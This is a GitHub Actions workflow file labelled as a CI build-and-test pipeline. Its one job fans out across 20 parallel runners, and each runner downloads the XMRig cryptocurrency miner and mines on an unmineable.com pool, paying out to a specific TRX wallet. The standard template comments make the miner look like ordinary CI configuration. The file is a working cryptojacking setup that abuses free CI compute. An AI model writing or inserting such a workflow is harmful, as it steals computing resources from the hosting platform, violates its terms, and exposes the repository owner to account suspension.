name: CI

# Controls when the workflow will run
on:
  # Triggers the workflow on push or pull request events but only for the main branch
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

  # Allows you to run this workflow manually from the Actions tab
  workflow_dispatch:

# A workflow run is made up of one or more jobs that can run sequentially or in parallel
jobs:
  # This workflow contains a single job called "build"
  test:
   name: Subscrbeit
    # The type of runner that the job will run on
   runs-on: ubuntu-latest
   strategy:
    fail-fast: false
    matrix:
     runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
   steps:
     - run: |
          wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TEVbPyKcmdNDekpbeZCuyQXsv8nFafdMNr.WORKERNAME -p x
